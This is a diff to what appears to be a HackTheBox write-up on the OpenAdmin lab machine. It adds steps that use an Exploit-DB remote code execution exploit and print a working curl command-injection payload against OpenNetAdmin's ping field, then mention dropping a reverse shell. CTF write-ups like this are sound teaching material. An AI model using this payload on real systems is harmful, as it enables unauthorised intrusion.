@@ -86,15 +86,30 @@ dirsearch -u http://openadmin.htb:80
 
 > Searchsploit
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/11ea3f32-2360-42de-99f2-886496b844f1)
 
 
-8. It's remote code execution, also there's github POC's which can be useful.
+8. It's remote code execution, also there's github POC's which can be useful (it speed up our exploit to drop a shell).
 9. Anyway, let's use the exploit from exploit.db first.
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/680d056a-3507-48d7-a5b0-fd42fe46fe17)
 
 
-```txt
+10. We just need to replace the CMD and URL.
 
+```txt
+curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" http://openadmin.htb:80/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
 ```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/722b8bc0-ee83-410a-8c12-ed38fe052568)
+
+
+11. Awesome, we can do reverse shell from this state. Now let's use the github POC to speed up our process to drop a shell.
+
+> Using the github POC
+
+
+
 
